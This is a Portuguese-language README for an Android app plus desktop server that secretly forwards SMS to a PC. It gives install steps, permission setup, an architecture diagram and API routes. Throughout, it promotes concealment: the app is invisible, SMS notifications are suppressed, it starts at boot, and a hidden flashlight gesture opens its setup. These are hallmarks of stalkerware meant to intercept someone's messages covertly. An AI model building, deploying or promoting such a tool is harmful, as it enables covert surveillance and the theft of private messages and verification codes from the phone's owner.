# 📱 SMS Forwarder v2 - APP SMS SECRETO

Receba SMS do seu Android **DIRETO NO SEU PC** de forma completamente oculta!

---

## ✨ O Que É?

Um **sistema invisível** que:
- ✅ Intercepta SMS no Android (sem notificação)
- ✅ Envia para seu PC em **tempo real**
- ✅ Mostra tudo em uma interface web
- ✅ Notifica no desktop quando SMS chegar
- ✅ O app nunca aparece no Android (completamente secreto!)

---

## 🚀 Como Usar

### 1️⃣ No seu PC/Notebook:

```bash
cd desktop
npm install
npm start
```

Abre automaticamente: `http://localhost:3000`

### 2️⃣ No seu Android:

1. **Pegue o arquivo: `app-release.apk`**
2. Envie para seu telefone (email, Telegram, etc)
3. Abra e instale
4. **Pronto!** 🎉

### 3️⃣ Dar Permissão (IMPORTANTE):

- Configurações → Apps → SMS Forwarder
- Permissões → SMS ✅
- Abra "App SMS padrão" e selecione SMS Forwarder ✅

### 4️⃣ Testar:

- Envie um SMS para você
- Vê na interface web em **segundos!** ⚡

---

## 🎯 Principais Características

### Para o Android:
- 🔒 **Totalmente Oculto** - Não aparece em lugar nenhum
- 🔇 **Silencioso** - Sem notificações de SMS
- ⚡ **Eficiente** - Consome pouca bateria
- 🚀 **Automático** - Inicia no boot
- 🌐 **Online** - Funciona em WiFi

### Para o PC:
- 🌐 **Interface Web Moderna** - Acessa pelo navegador
- 🔔 **Notificações Desktop** - Alerta quando SMS chegar
- 🎵 **Som/Vibra** - Notificação com áudio
- 📊 **Dashboard** - Total de SMS e não lidas
- ⏱️ **Tempo Real** - WebSocket para atualizações instantâneas
- 💾 **Histórico** - Tudo salvo localmente (SQLite)

---

## 📂 Estrutura

```
SMS-Forwarder-v2/
├── app/                    ← App Android (compilado em APK)
├── desktop/                ← Programa do PC (Electron)
│   ├── server.js          ← Backend Node.js
│   ├── main.js            ← Electron main
│   └── public/index.html   ← Interface web
├── INSTALAR_JA.md         ← Este arquivo
└── README-FINAL.md        ← Documentação
```

---

## 🔍 Como Funciona

```
Android recebe SMS
    ↓
SMSReceiver intercepta (secretamente)
    ↓
Envia para seu PC via WiFi
    ↓
Servidor Node.js recebe e salva
    ↓
WebSocket avisa a interface web
    ↓
Você vê a mensagem INSTANTANEAMENTE
    ↓
Desktop notifica você
```

---

## ⚙️ Configurar IP (Se Necessário)

Se quiser mudar o IP do servidor:

1. Instale o APK
2. **Ligue a lanterna 5 vezes rapidinho** (inicia setup)
3. Digite o IP: `http://seu-ip:3000`
4. Salva

---

## 🆘 Se Não Funcionar...

### SMS não chega?
- Android e PC na **mesma WiFi**? ✓
- Permissão de SMS dada? ✓
- Backend Node.js rodando? ✓

### Descobrir IP:

**Windows:** `cmd` → `ipconfig` → procura "IPv4"

**Mac/Linux:** `terminal` → `ifconfig` → procura "inet"

---

## 💻 Requisitos

**PC:**
- Node.js (versão 14+)
- Qualquer navegador
- WiFi

**Android:**
- Android 7.0+ (API 24+)
- WiFi (mesma rede do PC)
- Permissão de SMS

---

## 📊 API (Se quiser integrar):

```
POST   /api/sms                    Receber SMS
GET    /api/messages               Todas as mensagens
GET    /api/messages/unread        Não lidas
PUT    /api/messages/:id/read      Marcar como lida
DELETE /api/messages/:id           Deletar uma
DELETE /api/messages               Deletar todas
```

---

## 🔐 Segurança

⚠️ **Este app é para uso PESSOAL/LOCAL**

Para produção/internet:
- Use HTTPS em vez de HTTP
- Adicione autenticação
- Criptografe os dados
- Não exponha em redes públicas

---

## 📝 Resumo

| Aspecto | Status |
|--------|--------|
| App oculto no Android | ✅ Sim |
| Sem notificação de SMS | ✅ Sim |
| Tempo real | ✅ Sim |
| Notificação no PC | ✅ Sim |
| Interface web | ✅ Sim |
| Fácil de instalar | ✅ Sim |

---

## 🎓 Próximas Melhorias

- [ ] Responder SMS do PC
- [ ] Integração WhatsApp
- [ ] Backup em cloud
- [ ] App desktop nativa (Electron empacotado)
- [ ] Múltiplos telefones
- [ ] Filtros avançados

---

**Pronto! Seu sistema de SMS secreto está rodando! 🎉**

Dúvidas? Leia o `INSTALAR_JA.md` para um guia ainda mais rápido!

---

*Criado com ❤️ para você*
